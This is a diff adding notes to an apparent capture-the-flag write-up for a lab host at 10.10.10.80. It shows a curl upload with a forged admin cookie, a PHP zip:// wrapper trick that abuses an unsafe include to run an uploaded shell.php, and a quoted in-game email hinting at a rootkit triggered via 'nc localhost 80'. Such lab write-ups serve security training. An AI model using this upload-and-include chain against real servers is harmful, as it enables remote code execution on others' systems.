@@ -97,3 +97,17 @@ using curl will then post the file to the webserver byte for byte there by I don
 
 
 curl --cookie "admin=1; PHPSESSID=oj82onalo99pfrtonsaven2jr5" -F "submit=true" -F "token=b8ed78fb5c0b1a51dd48ed4d53ef438dcb6d3ca34f0b54781c137c85bd0834d6" -F "tip=<hello.php.gz" http://10.10.10.80/?op=upload
+
+unpak the zip file by using the zip:// wrapper php have, this way will unpack the shell.php file from the zip file.
+The reason for not adding .php to the url is because of how the include it written
+if(!(include $op . ".php"))
+http://10.10.10.80/?op=zip://uploads/10.10.15.86/1c6d42f66d903b822a8396ee7b4f83c9927b32c1%23shell
+
+Mail : 
+We got a suspicious email from the DarkArmy claiming there is a
+      Remote Code Execution bug on our Webserver.  I don't trust them
+      and ran rkhunter, it reported that there a rootkit installed
+      called: apache_modrootme backdoor.</p>
+    <p>According to my research, if this rootkit was on the server I
+      should be able to run "nc localhost 80" and then type get root to
+      get<br>
